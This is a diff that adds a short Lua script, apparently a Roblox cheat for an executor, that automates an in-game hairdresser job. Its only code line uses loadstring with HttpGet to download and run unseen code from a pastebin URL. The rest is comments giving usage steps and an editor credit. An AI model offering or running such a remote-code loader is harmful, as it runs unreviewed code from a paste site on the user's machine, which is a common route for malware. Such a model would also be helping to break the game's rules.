@@ -1,0 +1,14 @@
+loadstring(game.HttpGet(game, "https://pastebin.com/raw/SgzFf9XP")) ()
+ 
+--INSTRUCTIONS:
+--start the hairdresser job,
+--execute script,
+--enable gui,
+--stand by one of the chairs,
+--click the green done button on the hair changer,
+--should start working,
+--if it doesn't work execute again and use the new gui that shows up
+ 
+--Edited by Joseph8 in SynX discord
+ 
+--Enjoy
